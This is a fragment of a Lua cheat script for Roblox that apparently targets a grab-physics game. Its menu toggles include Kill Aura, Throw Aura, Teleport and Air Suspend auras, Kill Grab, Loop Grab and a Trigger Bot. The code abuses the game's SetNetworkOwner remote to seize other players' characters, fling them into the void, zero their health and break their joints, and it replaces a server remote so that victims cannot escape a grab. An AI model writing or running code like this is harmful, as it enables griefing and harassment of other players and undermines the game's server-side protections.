        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild('HumanoidRootPart')

        if not hrp then
            return
        end

        for _, player in pairs(Players:GetPlayers())do
            if player == LocalPlayer or isFriend(player) then
                continue
            end

            local c = player.Character
            local root = c and c:FindFirstChild('HumanoidRootPart')

            if not root then
                continue
            end

            local dist = (hrp.Position - root.Position).Magnitude

            if state.KillAura and dist < 29 then
                SetNetworkOwner:FireServer(root, root.CFrame)
                DestroyGrabLine:FireServer(root)
                handlePartOwner(c, function()
                    root.CFrame = CFrame.new(0, 9e13, 0)

                    task.wait()

                    root.CFrame = CFrame.new(0, 9e11, 0)

                    local bv = Instance.new('BodyVelocity')

                    bv.Velocity = Vector3.new(0, 9e12, 0)
                    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                    bv.Parent = root

                    task.delay(2, function()
                        if bv then
                            bv:Destroy()
                        end
                    end)
                end)
            end
            if state.ThrowAura then
                if dist <= throwRadius then
                    local bv = root:FindFirstChild('ThrowBV')

                    if not bv then
                        bv = Instance.new('BodyVelocity')
                        bv.Name = 'ThrowBV'
                        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                        bv.Parent = root
                        throwBodies[root] = bv
                    end

                    bv.Velocity = Vector3.new(math.random(-throwSpeed, throwSpeed), math.random(5, throwSpeed), math.random(-throwSpeed, throwSpeed))

                    pcall(function()
                        SetNetworkOwner:FireServer(root, root.CFrame)
                    end)
                else
                    if throwBodies[root] then
                        throwBodies[root]:Destroy()

                        throwBodies[root] = nil
                    end
                end
            end
            if state.TeleportAura and dist < 30 then
                local targetPos = TELEPORT_LOCATIONS[teleportTarget] or Vector3.zero

                pcall(function()
                    SetNetworkOwner:FireServer(root, root.CFrame)
                end)

                root.CFrame = CFrame.new(targetPos)

                local bp = Instance.new('BodyPosition')

                bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                bp.P = 50000
                bp.D = 1250
                bp.Position = targetPos
                bp.Parent = root

                local bg = Instance.new('BodyGyro')

                bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                bg.CFrame = root.CFrame
                bg.Parent = root
                teleportBodies[player] = bp
                teleportGyros[player] = bg
            end
            if state.AirAura then
                local bv = airBodies[player]

                if not bv or not bv.Parent then
                    bv = Instance.new('BodyVelocity')
                    bv.Name = 'AirBV'
                    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                    bv.Parent = root
                    airBodies[player] = bv
                end

                bv.Velocity = Vector3.new(0, airSpeed, 0)

                pcall(function()
                    SetNetworkOwner:FireServer(root, root.CFrame)
                end)
            end
        end
    end)
end
function stopAuraLoop()
    if auraConn then
        auraConn:Disconnect()

        auraConn = nil
    end

    for _, v in pairs(throwBodies)do
        if v then
            v:Destroy()
        end
    end
    for _, v in pairs(airBodies)do
        if v then
            v:Destroy()
        end
    end
    for _, v in pairs(teleportBodies)do
        if v then
            v:Destroy()
        end
    end
    for _, v in pairs(teleportGyros)do
        if v then
            v:Destroy()
        end
    end

    throwBodies = {}
    airBodies = {}
    teleportBodies = {}
    teleportGyros = {}
end

AuraBox:AddCheckbox('KillAura', {
    Text = 'Kill Aura',
    Default = false,
}):OnChanged(function(v)
    state.KillAura = v

    if v then
        startAuraLoop()
    else
        stopAuraLoop()
    end
end)
AuraBox:AddCheckbox('ThrowAura', {
    Text = 'Throw Aura',
    Default = false,
}):OnChanged(function(v)
    state.ThrowAura = v

    if v then
        startAuraLoop()
    else
        stopAuraLoop()
    end
end)
AuraBox:AddCheckbox('TeleportAura', {
    Text = 'Teleport Aura',
    Default = false,
}):OnChanged(function(v)
    state.TeleportAura = v

    if v then
        startAuraLoop()
    else
        stopAuraLoop()
    end
end)
AuraBox:AddCheckbox('AirAura', {
    Text = 'Air Suspend Aura',
    Default = false,
}):OnChanged(function(v)
    state.AirAura = v

    if v then
        startAuraLoop()
    else
        stopAuraLoop()
    end
end)
AuraBox:AddDropdown('TeleportTarget', {
    Text = 'Teleport Target',
    Values = {
        'Clouds',
        'Spawn',
        'Void',
    },
    Default = 'Clouds',
}):OnChanged(function(v)
    teleportTarget = v
end)
AuraBox:AddSlider('ThrowSpeed', {
    Text = 'Throw Speed',
    Default = 100,
    Min = 10,
    Max = 1000,
}):OnChanged(function(v)
    throwSpeed = v
end)
AuraBox:AddSlider('AirSpeed', {
    Text = 'Air Suspend Speed',
    Default = 50,
    Min = -100,
    Max = 500,
}):OnChanged(function(v)
    airSpeed = v
end)

SvcRS = game:GetService('ReplicatedStorage')
SvcWS = game:GetService('Workspace')
SvcRun = game:GetService('RunService')
SvcInput = game:GetService('UserInputService')
SvcDebris = game:GetService('Debris')
SvcPlayers = game:GetService('Players')
SvcTween = game:GetService('TweenService')
SvcCtx = game:GetService('ContextActionService')
SvcLight = game:GetService('Lighting')
Me = SvcPlayers.LocalPlayer
Cam = SvcWS.CurrentCamera
GrabFolder = SvcRS:WaitForChild('GrabEvents')
EvSetOwner = GrabFolder:WaitForChild('SetNetworkOwner')
EvDestroyLine = GrabFolder:WaitForChild('DestroyGrabLine')
EvCreateLine = GrabFolder:WaitForChild('CreateGrabLine')
EvExtendLine = GrabFolder:WaitForChild('ExtendGrabLine')
FnSpawnToy = SvcRS:WaitForChild('MenuToys'):WaitForChild('SpawnToyRemoteFunction')
EvDestroyToy = SvcRS:WaitForChild('MenuToys'):WaitForChild('DestroyToy')
ToysFolder = SvcWS:WaitForChild(Me.Name .. 'SpawnedInToys')

function LocalChar()
    return Me.Character
end
function LocalRoot()
    local c = LocalChar()

    return c and c:FindFirstChild('HumanoidRootPart')
end
function GrabbedPart()
    local gf = SvcWS:FindFirstChild('GrabParts')
    local gp = gf and gf:FindFirstChild('GrabPart')
    local w = gp and gp:FindFirstChild('WeldConstraint')

    return w and w.Part1 or nil
end
function GrabbedChar()
    local p = GrabbedPart()

    return p and p.Parent or nil
end
function InPlot(plr)
    local pi = SvcWS:FindFirstChild('PlotItems')
    local pp = pi and pi:FindFirstChild('PlayersInPlots')

    return pp and pp:FindFirstChild(plr.Name) ~= nil
end
function PlayerList()
    local t = {}

    for _, p in ipairs(SvcPlayers:GetPlayers())do
        if p ~= Me then
            table.insert(t, p.DisplayName .. ' (@' .. p.Name .. ')')
        end
    end

    if #t == 0 then
        table.insert(t, 'No players')
    end

    return t
end
function DoSpawnToy(name, cf)
    local r = LocalRoot()

    if not r then
        return nil
    end

    return FnSpawnToy:InvokeServer(name, cf or r.CFrame * CFrame.new(5, 5, 20), Vector3.zero)
end
function ClaimOwner(part)
    local r = LocalRoot()

    if r and part and part:IsA('BasePart') then
        EvSetOwner:FireServer(part, r.CFrame)
    end
end

GrabOptions = {
    'Throw on Release',
    'Noclip Grab',
    'Ragdoll Grab',
    'Unweld Grab',
    'Kill Grab',
    'Kick Grab',
    'Loop Grab',
    'Anchor Grab',
    'Massless Grab',
    'Invisible Grab',
    'Heavy Objects Grab',
    'Trigger Bot',
    'Extend Line',
}
GrabEnabled = {}
GrabMasterOn = false
ThrowConn = nil
ThrowForce = 750
_G.strength = ThrowForce
UnweldConn = nil
SpinActive = false
SpinConn = nil
SpinSpeed = 20
AnchorCoro = nil
AnchorParts = {}
AnchorConns = {}

local MasslessSense = 30

MasslessConn = nil
TBReady = true
TBLastTarget = nil
TBLastHit = 0
TBConn = nil
TBDist = 20
TBThrottle = 0.008
TBLastCheck = 0
TBMemory = 0.1
TBPreDelay = 0.00001
TBPostDelay = 0.05
TBRayPrms = RaycastParams.new()
TBRayPrms.FilterType = Enum.RaycastFilterType.Exclude

local InvisLineOn = false

lineDistanceV = 11
increaseLineExtendV = 7
infLineExtendT = false

local extendInputConn = nil
local extendChildConn = nil

kg_Players = game:GetService('Players')
kg_ReplicatedStorage = game:GetService('ReplicatedStorage')
kg_UserInputService = game:GetService('UserInputService')
kg_RunService = game:GetService('RunService')
kg_plr = kg_Players.LocalPlayer
kg_camera = workspace.CurrentCamera
kg_GrabEvents = kg_ReplicatedStorage:WaitForChild('GrabEvents')
kg_CreateGrabLine = kg_GrabEvents:WaitForChild('CreateGrabLine')
kg_SetNetworkOwner = kg_GrabEvents:WaitForChild('SetNetworkOwner')
kg_DestroyGrabLine = kg_GrabEvents:WaitForChild('DestroyGrabLine')
kg_Active = false
kg_FKeyActive = false
kg_fAttackTarget = nil
kg_fAttackConn = nil
kg_mainThread = nil
kg_inputConn = nil
lg_Players = game:GetService('Players')
lg_ReplicatedStorage = game:GetService('ReplicatedStorage')
lg_UserInputService = game:GetService('UserInputService')
lg_RunService = game:GetService('RunService')
lg_plr = lg_Players.LocalPlayer
lg_SetNetworkOwner = lg_ReplicatedStorage:WaitForChild('GrabEvents'):WaitForChild('SetNetworkOwner')
lg_Active = false
lg_FTargetActive = false
lg_fGrabConn = nil
lg_mainThread = nil
lg_inputConn = nil

function IsDescOf(target, ancestor)
    local c = target.Parent

    while c do
        if c == ancestor then
            return true
        end

        c = c.Parent
    end

    return false
end
function CleanConns(t)
    for _, c in ipairs(t)do
        if c and c.Connected then
            c:Disconnect()
        end
    end

    table.clear(t)
end
function MakeAnchorHighlight(parent)
    local h = Instance.new('Highlight')

    h.DepthMode = Enum.HighlightDepthMode.Occluded
    h.FillTransparency = 1
    h.Name = 'GrabAnchorHL'
    h.OutlineColor = Color3.new(0, 0, 1)
    h.OutlineTransparency = 0.5
    h.Parent = parent

    return h
end
function MakeMovers(part, pos, rot)
    local bp = Instance.new('BodyPosition')

    bp.P = 15000
    bp.D = 200
    bp.MaxForce = Vector3.new(5e6, 5e6, 5e6)
    bp.Position = pos
    bp.Parent = part

    local bg = Instance.new('BodyGyro')

    bg.P = 15000
    bg.D = 200
    bg.MaxTorque = Vector3.new(5e6, 5e6, 5e6)
    bg.CFrame = rot
    bg.Parent = part
end
function ApplyThrow(v)
    if ThrowConn then
        ThrowConn:Disconnect()

        ThrowConn = nil
    end
    if not v then
        return
    end

    ThrowConn = SvcWS.ChildAdded:Connect(function(m)
        if m.Name ~= 'GrabParts' then
            return
        end

        local gp = m:FindFirstChild('GrabPart')
        local w = gp and gp:FindFirstChild('WeldConstraint')
        local tgt = w and w.Part1

        if not tgt then
            return
        end

        local bv = Instance.new('BodyVelocity', tgt)

        m:GetPropertyChangedSignal('Parent'):Connect(function()
            if m.Parent then
                return
            end
            if SvcInput:GetLastInputType() == Enum.UserInputType.MouseButton2 then
                bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                bv.Velocity = Cam.CFrame.LookVector * ThrowForce

                SvcDebris:AddItem(bv, 1)
            else
                bv:Destroy()
            end
        end)
    end)
end
function ApplyNoclip(v)
    if getgenv().ConnNoclipGrab then
        getgenv().ConnNoclipGrab:Disconnect()

        getgenv().ConnNoclipGrab = nil
    end
    if not v then
        local c = GrabbedChar()

        if c then
            for _, p in ipairs(c:GetDescendants())do
                if p:IsA('BasePart') and not p.Anchored then
                    p.CanCollide = true
                end
            end
        end

        return
    end

    getgenv().ConnNoclipGrab = SvcRun.Heartbeat:Connect(function()
        local c = GrabbedChar()

        if not c then
            return
        end

        for _, p in ipairs(c:GetDescendants())do
            if p:IsA('BasePart') and not p.Anchored then
                p.CanCollide = false
            end
        end
    end)
end
function ApplyRagdoll(v)
    if v then
        local pal, pal2

        pal2 = plr.PlayerGui.MenuGui.Menu.TabContents.ToyDestroy.Contents.ChildAdded:Connect(function(c)
            if c.Name == 'PalletLightBrown' then
                pal = c

                task.wait()
                pal2:Disconnect()

                pal2 = nil
            end
        end)

        local ragd = spawntoy('PalletLightBrown', HRP.CFrame * CFrame.new(5, 5, 20))
        local partt = ragd:WaitForChild('SoundPart', 0.1)

        ragd.Name = 'ragdoll'

        spawn(function()
            task.wait(1)

            local lbl = pal.ViewItemButton.NewMessage:Clone()

            lbl.Name = 'Ragdoll'
            lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
            lbl.Text = 'Ragdoll Grab'
            lbl.Visible = true
            lbl.Parent = pal.ViewItemButton
        end)

        repeat
            sno(partt)
            task.wait()
        until partt:FindFirstChild('PartOwner')

        partt.AssemblyLinearVelocity = Vector3.new(0, 10000, 0)

        spawn(function()
            for _, v2 in pairs(ragd:GetDescendants())do
                if v2:IsA('Part') then
                    v2.Transparency = 1
                    v2.CanCollide = false
                end
            end
        end)

        cons.rgarab1 = workspace.ChildAdded:Connect(function(c)
            if c.Name ~= 'GrabParts' then
                return
            end

            local part = c:FindFirstChild('GrabPart') or c:WaitForChild('GrabPart', 3)

            if not part then
                return
            end

            local obj = part.WeldConstraint.Part1

            while workspace:FindFirstChild('GrabParts') and task.wait() do
                if obj and obj.Parent and obj.Parent:FindFirstChild('HumanoidRootPart') and obj.Parent:FindFirstChild('Humanoid') and obj.Parent.Humanoid:FindFirstChild('Ragdolled') and obj.Parent.Humanoid.Ragdolled.Value == false then
                    spawn(function()
                        partt.AssemblyLinearVelocity = Vector3.new(0, 100, 0)
                        partt.CFrame = obj.Parent.HumanoidRootPart.CFrame

                        task.wait(0.05)

                        partt.CFrame = CFrame.new(0, 1e9, 0)
                    end)
                end
            end
        end)
    else
        if cons.rgarab1 then
            cons.rgarab1:Disconnect()
        end

        pcall(function()
            DestroyToy:FireServer(inv.ragdoll)
        end)
    end
end
function ApplyUnweld(v)
    if UnweldConn then
        UnweldConn:Disconnect()

        UnweldConn = nil
    end
    if not v then
        return
    end

    UnweldConn = workspace.ChildAdded:Connect(function(model)
        if model.Name ~= 'GrabParts' then
            return
        end

        local grabPart = model:FindFirstChild('GrabPart')
        local weld2 = grabPart and grabPart:FindFirstChildOfClass('WeldConstraint')
        local partToTP = weld2 and weld2.Part1

        if not partToTP or not partToTP:IsA('BasePart') or partToTP.Anchored then
            return
        end

        task.wait(0.01)
        pcall(function()
            partToTP.CFrame = CFrame.new(partToTP.Position.X, -9999, partToTP.Position.Z)
        end)
    end)
end
function ApplyKill(v)
    KillOnGrab = v
end
function ApplySpin(v)
    SpinActive = v

    if SpinConn then
        SpinConn:Disconnect()

        SpinConn = nil
    end
    if not v then
        return
    end

    SpinConn = SvcWS.ChildAdded:Connect(function(e)
        if e.Name ~= 'GrabParts' or not e:FindFirstChild('GrabPart') then
            return
        end

        local dp = SvcWS.GrabParts and SvcWS.GrabParts:FindFirstChild('DragPart')

        if dp then
            local ao = dp:FindFirstChild('AlignOrientation')

            if ao then
                ao:Destroy()
            end
        end

        local w = e.GrabPart:FindFirstChild('WeldConstraint')
        local p1 = w and w.Part1

        if not p1 then
            return
        end

        while SvcWS:FindFirstChild('GrabParts') and SpinActive do
            p1.AssemblyAngularVelocity = Vector3.new(0, SpinSpeed, 0)

            task.wait()
        end
    end)
end
function ApplyHeavy(v)
    function SetForce(amount)
        local rf = game:FindFirstChild('ReplicatedFirst')
        local rfGrab = rf and rf:FindFirstChild('GrabParts')

        if rfGrab and rfGrab:FindFirstChild('DragPart') then
            local dp = rfGrab.DragPart

            if dp:FindFirstChild('AlignPosition') then
                dp.AlignPosition.MaxForce = amount
            end
            if dp:FindFirstChild('AlignOrientation') then
                dp.AlignOrientation.MaxTorque = amount
            end
        end

        local wp = workspace:FindFirstChild('GrabParts')

        if wp and wp:FindFirstChild('DragPart') then
            local dp = wp.DragPart

            if dp:FindFirstChild('AlignPosition') then
                dp.AlignPosition.MaxForce = amount
            end
            if dp:FindFirstChild('AlignOrientation') then
                dp.AlignOrientation.MaxTorque = amount
            end
        end
    end

    SetForce(v and math.huge or 60000)
end
function AnchorLoop()
    while true do
        pcall(function()
            local gf = SvcWS:FindFirstChild('GrabParts')

            if not gf then
                return
            end

            local gp = gf:FindFirstChild('GrabPart')

            if not gp then
                return
            end

            local w = gp:FindFirstChild('WeldConstraint')

            if not w or not w.Part1 then
                return
            end

            local prim = w.Part1.Parent and w.Part1.Parent.PrimaryPart

            if not prim then
                return
            end
            if IsDescOf(prim, SvcWS.Map) then
                return
            end

            for _, p in pairs(SvcPlayers:GetChildren())do
                if p.Character and IsDescOf(prim, p.Character) then
                    return
                end
            end

            if not table.find(AnchorParts, prim) then
                MakeAnchorHighlight(prim.Parent)
                table.insert(AnchorParts, prim)

                local conn = prim.Parent.DescendantAdded:Connect(function(d)
                    if d.Name ~= 'PartOwner' then
                        return
                    end

                    local h = prim.Parent:FindFirstChild('GrabAnchorHL')

                    if not h then
                        return
                    end

                    h.OutlineColor = d.Value ~= Me.Name and Color3.new(1, 0, 0) or Color3.new(0, 0, 1)
                end)

                table.insert(AnchorConns, conn)
            end

            for _, child in ipairs(prim:GetChildren())do
                if child:IsA('BodyPosition') or child:IsA('BodyGyro') then
                    child:Destroy()
                end
            end

            while SvcWS:FindFirstChild('GrabParts') do
                task.wait()
            end

            MakeMovers(prim, prim.Position, prim.CFrame)
        end)
        task.wait()
    end
end
function ReleaseAllAnchor()
    for _, part in ipairs(AnchorParts)do
        if part then
            local bp = part:FindFirstChild('BodyPosition')
            local bg = part:FindFirstChild('BodyGyro')
            local h = part.Parent and part.Parent:FindFirstChild('GrabAnchorHL')

            if bp then
                bp:Destroy()
            end
            if bg then
                bg:Destroy()
            end
            if h then
                h:Destroy()
            end
        end
    end

    CleanConns(AnchorConns)
    table.clear(AnchorParts)
end
function ApplyAnchor(v)
    if v then
        if not AnchorCoro or coroutine.status(AnchorCoro) == 'dead' then
            AnchorCoro = coroutine.create(AnchorLoop)

            coroutine.resume(AnchorCoro)
        end
    else
        if AnchorCoro and coroutine.status(AnchorCoro) ~= 'dead' then
            coroutine.close(AnchorCoro)

            AnchorCoro = nil
        end

        ReleaseAllAnchor()
    end
end
function ApplyMassless(v)
    if MasslessConn then
        MasslessConn:Disconnect()

        MasslessConn = nil
    end
    if not v then
        return
    end

    MasslessConn = SvcWS.ChildAdded:Connect(function(m)
        if m.Name ~= 'GrabParts' then
            return
        end

        local dp = m:FindFirstChild('DragPart')

        if not dp then
            return
        end

        local ap = dp:FindFirstChild('AlignPosition')
        local ao = dp:FindFirstChild('AlignOrientation')

        if not (ap and ao) then
            return
        end

        pcall(function()
            ap.Responsiveness = MasslessSense
            ap.MaxForce = math.huge
            ap.MaxVelocity = math.huge
            ao.Responsiveness = MasslessSense
            ao.MaxTorque = math.huge
        end)
    end)
end
function TBFindTarget()
    local c = LocalChar()

    if not c or not c:FindFirstChild('HumanoidRootPart') then
        return
    end
    if SvcWS:FindFirstChild('GrabParts') then
        return
    end

    local origin = Cam.CFrame.Position
    local dir = Cam.CFrame.LookVector

    TBRayPrms.FilterDescendantsInstances = {
        c,
        SvcWS.Terrain,
    }

    local res

    for _, d in ipairs({
        dir,
        (dir + Vector3.new(0, 0.075, 0)).Unit,
        (dir + Vector3.new(0, -7.5E-2, 0)).Unit,
    })do
        res = SvcWS:Raycast(origin, d * 1000, TBRayPrms)

        if res then
            break
        end
    end

    if not res then
        return
    end

    local m = res.Instance:FindFirstAncestorOfClass('Model')

    if not m or m == c then
        return
    end

    local hum = m:FindFirstChildOfClass('Humanoid')
    local root = m:FindFirstChild('HumanoidRootPart')

    if not hum or hum.Health <= 0 or not root then
        return
    end
    if (c.HumanoidRootPart.Position - root.Position).Magnitude > TBDist then
        return
    end

    return m
end
function ApplyTriggerBot(v)
    if TBConn then
        TBConn:Disconnect()

        TBConn = nil
    end
    if not v then
        return
    end

    TBConn = SvcRun.Heartbeat:Connect(function()
        if not TBReady then
            return
        end
        if SvcInput:GetFocusedTextBox() then
            return
        end
        if tick() - TBLastCheck < TBThrottle then
            return
        end

        TBLastCheck = tick()

        local t = TBFindTarget()

        if t then
            TBLastTarget = t
            TBLastHit = tick()
        elseif TBLastTarget and tick() - TBLastHit > TBMemory then
            TBLastTarget = nil
        end

        local c = LocalChar()
        local root = TBLastTarget and TBLastTarget:FindFirstChild('HumanoidRootPart')

        if not (TBLastTarget and c and c:FindFirstChild('HumanoidRootPart') and root) then
            return
        end
        if (c.HumanoidRootPart.Position - root.Position).Magnitude > TBDist then
            TBLastTarget = nil

            return
        end

        TBReady = false

        task.spawn(function()
            task.wait(TBPreDelay)
            pcall(mouse1press)

            local t0 = tick()

            repeat
                task.wait(0.02)
            until not SvcWS:FindFirstChild('GrabParts') or tick() - t0 > 1.6

            task.wait(TBPostDelay)

            TBReady = true
            TBLastTarget = nil
        end)
    end)
end
function ApplyInvisLine(v)
    InvisLineOn = v
    _G.InvisLine = v or nil

    if v then
        task.spawn(function()
            while InvisLineOn do
                EvCreateLine:FireServer()
                task.wait()
            end
        end)
    end
end
function startExtendLine()
    stopExtendLine()

    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local hrp = char:WaitForChild('HumanoidRootPart')
    local hum = char:WaitForChild('Humanoid')

    extendInputConn = UserInputService.InputChanged:Connect(function(input)
        if not infLineExtendT then
            return
        end
        if input.UserInputType == Enum.UserInputType.MouseWheel then
            if lineDistanceV < 11 then
                lineDistanceV = 11
            end
            if input.Position.Z > 0 then
                lineDistanceV += increaseLineExtendV
            elseif input.Position.Z < 0 then
                lineDistanceV -= increaseLineExtendV
            end
        end
    end)
    extendChildConn = workspace.ChildAdded:Connect(function(child)
        if not infLineExtendT then
            return
        end
        if child.Name ~= 'GrabParts' or not child:IsA('Model') then
            return
        end

        local grabPartsModel = child
        local dragPart = grabPartsModel:WaitForChild('DragPart')
        local clonedDragPart = dragPart:Clone()

        clonedDragPart.Name = 'DragPart1'

        local attach = clonedDragPart:FindFirstChild('DragAttach')

        if clonedDragPart:FindFirstChild('AlignPosition') and attach then
            clonedDragPart.AlignPosition.Attachment1 = attach
        end

        clonedDragPart.Parent = grabPartsModel

        local camera = workspace.CurrentCamera

        lineDistanceV = (clonedDragPart.Position - camera.CFrame.Position).Magnitude

        if clonedDragPart:FindFirstChild('AlignOrientation') then
            clonedDragPart.AlignOrientation.Enabled = false
        end
        if dragPart:FindFirstChild('AlignPosition') then
            dragPart.AlignPosition.Enabled = false
        end

        task.spawn(function()
            while grabPartsModel.Parent and infLineExtendT do
                clonedDragPart.Position = camera.CFrame.Position + camera.CFrame.LookVector * lineDistanceV

                RunService.RenderStepped:Wait()
            end

            lineDistanceV = 11
        end)
    end)
end
function stopExtendLine()
    if extendInputConn then
        extendInputConn:Disconnect()

        extendInputConn = nil
    end
    if extendChildConn then
        extendChildConn:Disconnect()

        extendChildConn = nil
    end

    lineDistanceV = 11
end
function ApplyExtendLine(v)
    infLineExtendT = v

    if v then
        startExtendLine()
    else
        stopExtendLine()
    end
end
function ApplyLoopGrab(on)
    Toggles.LoopGrabToggle:SetValue(on)
end
function ApplyKickGrab(on)
    Toggles.KickGrabToggle:SetValue(on)
end

local ApplyFns = {
    ['Throw on Release'] = ApplyThrow,
    ['Noclip Grab'] = ApplyNoclip,
    ['Ragdoll Grab'] = ApplyRagdoll,
    ['Unweld Grab'] = ApplyUnweld,
    ['Kill Grab'] = ApplyKill,
    ['Kick Grab'] = ApplyKickGrab,
    ['Loop Grab'] = ApplyLoopGrab,
    ['Heavy Objects Grab'] = ApplyHeavy,
    ['Anchor Grab'] = ApplyAnchor,
    ['Massless Grab'] = ApplyMassless,
    ['Invisible Grab'] = ApplyInvisLine,
    ['Trigger Bot'] = ApplyTriggerBot,
    ['Extend Line'] = ApplyExtendLine,
}

SvcWS.ChildAdded:Connect(function(c)
    if not KillOnGrab then
        return
    end
    if not (c:IsA('Model') and c.Name == 'GrabParts') then
        return
    end

    task.wait(0.05)

    local gp = c:FindFirstChild('GrabPart')
    local w = gp and gp:FindFirstChild('WeldConstraint')
    local tgt = w and w.Part1

    if not tgt or tgt.Parent == Me.Character then
        return
    end

    local hum = tgt.Parent:FindFirstChildOfClass('Humanoid')

    if not hum then
        return
    end

    pcall(function()
        hum.Health = 0

        tgt.Parent:BreakJoints()
    end)
end)
PanelTools:AddCheckbox('cbGrabMaster', {
    Text = 'Enable Grabs',
    Tooltip = 'Instantly enables or disables every selected grab',
    Default = false,
}):OnChanged(function(v)
    GrabMasterOn = v

    for name, active in pairs(GrabEnabled)do
        local fn = ApplyFns[name]

        if fn then
            fn(v and active)
        end
    end
end)
PanelTools:AddDivider()
PanelTools:AddDropdown('ddGrabModes', {
    Text = 'Active Grabs',
    Tooltip = 'Pick one or more modes. All selected grabs run together when the master toggle is ON',
    Values = GrabOptions,
    Default = {},
    Multi = true,
}):OnChanged(function(selectedMap)
    for _, name in ipairs(GrabOptions)do
        local wanted = selectedMap[name] == true
        local current = GrabEnabled[name] == true

        if wanted ~= current then
            GrabEnabled[name] = wanted

            if GrabMasterOn then
                local fn = ApplyFns[name]

                if fn then
                    fn(wanted)
                end
            end
        end
    end
end)
PanelTools:AddDivider()
PanelTools:AddCheckbox('LoopGrabToggle', {
    Text = 'Loop Grab',
    Default = false,
})
Toggles.LoopGrabToggle:OnChanged(function(state)
    if not state then
        getgenv().LoopGrabActive = false
        getgenv().FTargetGrabActive = false

        if getgenv().fGrabConnection then
            getgenv().fGrabConnection:Disconnect()

            getgenv().fGrabConnection = nil
        end
        if getgenv().LoopGrabInputConnection then
            getgenv().LoopGrabInputConnection:Disconnect()

            getgenv().LoopGrabInputConnection = nil
        end

        return
    end
    if getgenv().LoopGrabActive then
        return
    end

    getgenv().LoopGrabActive = true

    local Players = game:GetService('Players')
    local ReplicatedStorage = game:GetService('ReplicatedStorage')
    local UserInputService = game:GetService('UserInputService')
    local RunService = game:GetService('RunService')
    local plr = Players.LocalPlayer
    local SetNetworkOwner = ReplicatedStorage:WaitForChild('GrabEvents'):WaitForChild('SetNetworkOwner')

    task.spawn(function()
        while getgenv().LoopGrabActive do
            local grabParts = workspace:FindFirstChild('GrabParts')

            if not grabParts then
                task.wait()

                continue
            end

            local gp = grabParts:FindFirstChild('GrabPart')
            local weld = gp and gp:FindFirstChildOfClass('WeldConstraint')
            local part1 = weld and weld.Part1

            if part1 then
                local ownerPlayer = nil

                for _, pl in ipairs(Players:GetPlayers())do
                    if pl.Character and part1:IsDescendantOf(pl.Character) then
                        ownerPlayer = pl

                        break
                    end
                end

                while getgenv().LoopGrabActive and workspace:FindFirstChild('GrabParts') do
                    if ownerPlayer then
                        local tgtTorso = ownerPlayer.Character and ownerPlayer.Character:FindFirstChild('HumanoidRootPart')
                        local tgtHead = ownerPlayer.Character and ownerPlayer.Character:FindFirstChild('Head')
                        local myTorso = plr.Character and plr.Character:FindFirstChild('HumanoidRootPart')

                        if tgtTorso and myTorso and tgtHead then
                            pcall(function()
                                SetNetworkOwner:FireServer(tgtTorso, CFrame.lookAt(myTorso.Position, tgtTorso.Position))
                            end)
                        end
                    else
                        if part1.Parent then
                            local myTorso = plr.Character and plr.Character:FindFirstChild('HumanoidRootPart')

                            if myTorso then
                                pcall(function()
                                    SetNetworkOwner:FireServer(part1, CFrame.lookAt(myTorso.Position, part1.Position))
                                end)
                            end
                        end
                    end

                    task.wait()
                end
            end

            task.wait()
        end
    end)

    if game.PlaceId == 6961824067 then
        local G = game:GetService('ReplicatedStorage'):WaitForChild('GrabEvents')
        local existingEndGrab = G:FindFirstChild('EndGrabEarly')

        if existingEndGrab then
            existingEndGrab:Destroy()
        end

        Instance.new('RemoteEvent', G).Name = 'EndGrabEarly'
    end

    getgenv().FTargetGrabActive = false
    getgenv().fGrabConnection = nil

    function getCenterTarget()
        local cam = workspace.CurrentCamera
        local center = Vector2.new(cam.ViewportSize.X / 2, cam.ViewportSize.Y / 2)
        local myTorso = plr.Character and plr.Character:FindFirstChild('HumanoidRootPart')

        if not myTorso then
            return nil
        end

        local closestTarget = nil
        local minScreenDist = math.huge

        for _, p in ipairs(Players:GetPlayers())do
            if p ~= plr and p.Character and p.Character:FindFirstChild('HumanoidRootPart') then
                local tgtTorso = p.Character.HumanoidRootPart
                local dist = (tgtTorso.Position - myTorso.Position).Magnitude

                if dist <= 25 then
                    local screenPos, onScreen = cam:WorldToViewportPoint(tgtTorso.Position)

                    if onScreen then
                        local screenDist = (Vector2.new(screenPos.X, screenPos.Y) - center).Magnitude

                        if screenDist < minScreenDist then
                            minScreenDist = screenDist
                            closestTarget = p
                        end
                    end
                end
            end
        end

        return closestTarget
    end

    if getgenv().LoopGrabInputConnection then
        getgenv().LoopGrabInputConnection:Disconnect()

        getgenv().LoopGrabInputConnection = nil
    end

    getgenv().LoopGrabInputConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then
            return
        end
        if not getgenv().LoopGrabActive then
            return
        end
        if input.KeyCode == Enum.KeyCode.F then
            if getgenv().FTargetGrabActive then
                getgenv().FTargetGrabActive = false

                if getgenv().fGrabConnection then
                    getgenv().fGrabConnection:Disconnect()

                    getgenv().fGrabConnection = nil
                end
            else
                local target = getCenterTarget()

                if target then
                    getgenv().FTargetGrabActive = true

                    local cam = workspace.CurrentCamera

                    getgenv().fGrabConnection = RunService.RenderStepped:Connect(function()
                        if not getgenv().FTargetGrabActive or not target or not target.Character then
                            getgenv().FTargetGrabActive = false

                            if getgenv().fGrabConnection then
                                getgenv().fGrabConnection:Disconnect()

                                getgenv().fGrabConnection = nil
                            end

                            return
                        end

                        local tgtTorso = target.Character:FindFirstChild('HumanoidRootPart')
                        local tgtHead = target.Character:FindFirstChild('Head')
                        local myTorso = plr.Character and plr.Character:FindFirstChild('HumanoidRootPart')

                        if tgtTorso and myTorso and tgtHead then
                            SetNetworkOwner:FireServer(tgtTorso, tgtTorso.CFrame)

                            if tgtHead:FindFirstChild('PartOwner') then
                                local targetPos = cam.CFrame.Position + (cam.CFrame.LookVector * 23)
                                local newCFrame = CFrame.new(targetPos)

                                tgtTorso.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                                tgtTorso.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                                tgtTorso.CFrame = newCFrame

                                SetNetworkOwner:FireServer(tgtTorso, newCFrame)
                            end
                        end
                    end)
                end
            end
        end
    end)
end)
